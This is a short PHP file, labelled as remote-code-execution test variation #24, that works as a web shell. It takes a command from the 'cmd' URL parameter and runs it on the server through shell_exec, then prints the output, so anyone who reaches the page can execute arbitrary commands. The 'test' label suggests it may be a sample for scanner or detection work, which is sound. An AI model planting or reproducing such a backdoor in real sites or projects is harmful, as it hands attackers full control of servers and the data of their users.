<?php
// RCE test variation #24
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>